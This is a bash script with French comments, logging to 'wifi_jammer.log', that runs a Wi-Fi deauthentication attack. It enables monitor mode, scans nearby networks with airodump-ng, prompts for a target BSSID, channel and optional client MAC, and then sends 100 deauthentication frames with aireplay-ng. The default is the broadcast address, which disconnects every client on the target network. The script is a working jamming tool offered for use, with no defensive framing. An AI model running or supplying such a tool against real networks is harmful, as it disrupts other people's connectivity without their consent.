#!/bin/bash

set -euo pipefail

# Vérifier si l'utilisateur est root
if [[ $EUID -ne 0 ]]; then
    echo "[❌] Ce script doit être exécuté en root."
    exit 1
fi

# Configuration du logging
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_DIR="$SCRIPT_DIR/logs"
LOG_FILE="$LOG_DIR/wifi_jammer.log"

mkdir -p "$LOG_DIR"
echo "" > "$LOG_FILE"

log() {
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] $1" | tee -a "$LOG_FILE"
}

# Vérifier la configuration
CONFIG_FILE="$SCRIPT_DIR/config.json"
if [[ ! -f "$CONFIG_FILE" ]]; then
    log "[❌] Fichier config.json non trouvé !"
    exit 1
fi

# Charger les paramètres depuis config.json
WIFI_IFACE=$(jq -r '.wifi_interface' "$CONFIG_FILE")
MONITOR_SUPPORTED=$(jq -r '.monitor_supported' "$CONFIG_FILE")

if [[ -z "$WIFI_IFACE" || "$WIFI_IFACE" == "null" ]]; then
    log "[❌] Interface Wi-Fi non configurée dans config.json"
    exit 1
fi

if [[ "$MONITOR_SUPPORTED" != "true" ]]; then
    log "[⚠️] L'interface $WIFI_IFACE ne supporte pas le mode monitor. L'attaque pourrait échouer."
    read -p "Voulez-vous continuer quand même ? (o/N) " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Oo]$ ]]; then
        exit 1
    fi
fi

log "[✅] Interface détectée : $WIFI_IFACE"

# Activer le mode monitor si nécessaire
if ! iw dev "$WIFI_IFACE" info | grep -q "type monitor"; then
    log "[ℹ️] Activation du mode monitor sur $WIFI_IFACE..."
    airmon-ng start "$WIFI_IFACE"
    WIFI_IFACE="${WIFI_IFACE}mon"
    log "[✅] Mode monitor activé : $WIFI_IFACE"
fi

# Dossier des captures
CAPTURE_DIR="$SCRIPT_DIR/captures"
mkdir -p "$CAPTURE_DIR"

# Scan des réseaux Wi-Fi
log "[🔍] Scan des réseaux Wi-Fi en cours..."
airodump-ng --output-format csv -w "$CAPTURE_DIR/networks" "$WIFI_IFACE" --write-interval 1 &> /dev/null &

# Attendre un peu pour collecter des données
sleep 7

# Arrêter le scan
pkill airodump-ng

# Vérifier la présence du fichier
SCAN_FILE="$CAPTURE_DIR/networks-01.csv"
if [[ ! -f "$SCAN_FILE" ]]; then
    log "[❌] Aucun réseau détecté !"
    exit 1
fi

# Afficher les réseaux détectés
log "📡 Réseaux Wi-Fi détectés :"
awk -F',' '
NR>2 {
    ssid=$14
    canal=$4
    bssid=$1
    encryption=$6

    if (encryption ~ /WPA3/) {
        security="WPA3"
    } else if (encryption ~ /WPA2/) {
        security="WPA2"
    } else if (encryption ~ /WPA/) {
        security="WPA"
    } else if (encryption ~ /WEP/) {
        security="WEP"
    } else {
        security="OPEN"
    }

    printf "BSSID: %-20s | Canal: %-3s | Sécurité: %-4s | SSID: %s\n", bssid, canal, security, ssid
}' "$SCAN_FILE" | column -t

# Demander à l'utilisateur de choisir une cible
read -p "📡 Entrez le BSSID de la cible : " TARGET_BSSID
read -p "📡 Entrez le numéro du canal de la cible : " TARGET_CHANNEL

# Passer en mode écoute sur le bon canal
iw dev "$WIFI_IFACE" set channel "$TARGET_CHANNEL"

# Demander si on cible un client spécifique
read -p "Voulez-vous cibler un client spécifique ? (o/N) " -n 1 -r
echo
if [[ $REPLY =~ ^[Oo]$ ]]; then
    read -p "📡 Entrez l'adresse MAC du client (ou FF:FF:FF:FF:FF:FF pour tout déconnecter) : " CLIENT_MAC
else
    CLIENT_MAC="FF:FF:FF:FF:FF:FF"
fi

# Lancer l'attaque de désauthentification
log "[⚡] Envoi de paquets de désauthentification..."
aireplay-ng --deauth 100 -a "$TARGET_BSSID" -c "$CLIENT_MAC" "$WIFI_IFACE"

log "[✅] Attaque terminée."
